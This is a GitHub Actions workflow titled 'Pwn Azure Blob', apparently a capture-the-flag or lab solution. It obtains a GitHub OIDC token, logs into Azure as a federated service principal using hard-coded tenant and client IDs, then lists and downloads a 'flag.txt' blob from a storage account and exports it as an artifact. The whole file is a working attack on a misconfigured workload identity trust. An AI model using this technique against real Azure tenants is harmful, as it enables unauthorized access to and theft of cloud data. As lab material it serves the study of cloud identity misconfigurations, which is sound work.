name: Pwn Azure Blob

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  blob-access:
    runs-on: ubuntu-latest

    steps:
      - name: Get OIDC Token
        id: oidc
        uses: actions/github-script@v6
        with:
          script: |
            const id_token = await core.getIDToken("api://AzureADTokenExchange");
            core.setOutput("id_token", id_token);

      - name: Log into Azure via Federated Identity
        run: |
          echo "${{ steps.oidc.outputs.id_token }}" > oidc_token.txt

          az login --service-principal \
            --username c265ea2a-1235-446d-bd74-5d8228c904b1 \
            --tenant fdd066e1-ee37-49bc-b08f-d0e152119b04 \
            --federated-token "$(cat oidc_token.txt)"

      - name: List Blobs and Grab the Flag
        run: |
          az storage blob list \
            --account-name iamazurelab3d26800f7 \
            --container-name flag \
            --auth-mode login \
            --output table

          az storage blob download \
            --account-name iamazurelab3d26800f7 \
            --container-name flag \
            --name flag.txt \
            --file flag.txt \
            --auth-mode login

      - name: Upload the Flag Artifact
        uses: actions/upload-artifact@v3
        with:
          name: azure-flag
          path: flag.txt
